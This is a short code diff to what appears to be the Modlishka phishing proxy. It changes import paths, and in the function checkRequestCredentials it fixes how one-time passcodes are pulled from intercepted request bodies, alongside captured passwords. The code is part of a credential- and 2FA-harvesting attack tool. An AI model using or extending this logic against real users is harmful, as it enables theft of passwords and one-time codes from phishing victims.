@@ -6,9 +6,9 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
-	"github.com/thechiragjogani/modlishka/config"
-	"github.com/thechiragjogani/modlishka/runtime"
-	"github.com/thechiragjogani/modlishka/log"
+	"github.com/drk1wi/Modlishka/config"
+	"github.com/drk1wi/Modlishka/runtime"
+	"github.com/drk1wi/Modlishka/log"
 	"github.com/tidwall/buntdb"
 	"html/template"
 	"io"
@@ -571,9 +571,9 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Reques
 			creds.passwordFieldValue = passwords[1]
 		}
 		
-		otps := config.otpRegexp.FindStringSubmatch(queryString.Get(key))
+		otps := config.otpRegexp.FindStringSubmatch(decodedbody)
 		if len(otps) > 0 {
-			creds.otpFieldValue = otp[1]
+			creds.otpFieldValue = otps[1]
 		}
 
 		//for parameterName := range req.Form {
